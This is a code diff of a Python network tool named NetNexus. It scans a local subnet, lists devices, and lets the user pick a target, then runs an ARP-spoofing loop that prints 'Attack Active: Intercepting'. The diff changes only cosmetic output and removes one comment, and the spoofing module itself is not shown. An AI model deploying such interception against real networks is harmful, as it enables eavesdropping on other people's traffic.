@@ -16,26 +16,26 @@ def main():
     ip_range = "192.168.8.1/24"
 
     while True:
-        print("\n" + "="*40)
-        print("      NetNexus: Discovery & Control")
-        print("="*40)
+        print("\n" + "="*45)
+        print("      NetNexus: Discovery & Control Center")
+        print("="*45)
         print(f"[*] Scanning {ip_range}... please wait.")
         
         devices = scanner.scan(ip_range)
         
         print("\nID\tIP Address\t\tMAC Address\t\tDevice Name")
-        print("-" * 95)
+        print("-" * 100)
         for index, device in enumerate(devices):
             print(f"{index}\t{device['ip']}\t\t{device['mac']}\t{device['name']}")
         
-        print("-" * 95)
+        print("-" * 100)
         print("[R] Refresh/Rescan Network")
         print("[C] Cancel and Exit")
         
         user_input = input("\nSelect Target ID or Option: ").lower().strip()
 
         if user_input == 'c':
-            print("[*] Exiting NetNexus. Goodbye.")
+            print("[*] Exiting NetNexus.")
             sys.exit()
         elif user_input == 'r':
             print("[*] Refreshing network map...")
@@ -57,7 +57,6 @@ def main():
             print(f"[*] Attack Active: Intercepting {target_ip} ({target['name']})")
             packet_count = 0
             while True:
-                # Sends the spoofed packets
                 spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
                 packet_count += 2
                 # Counter proves the script is running and not frozen
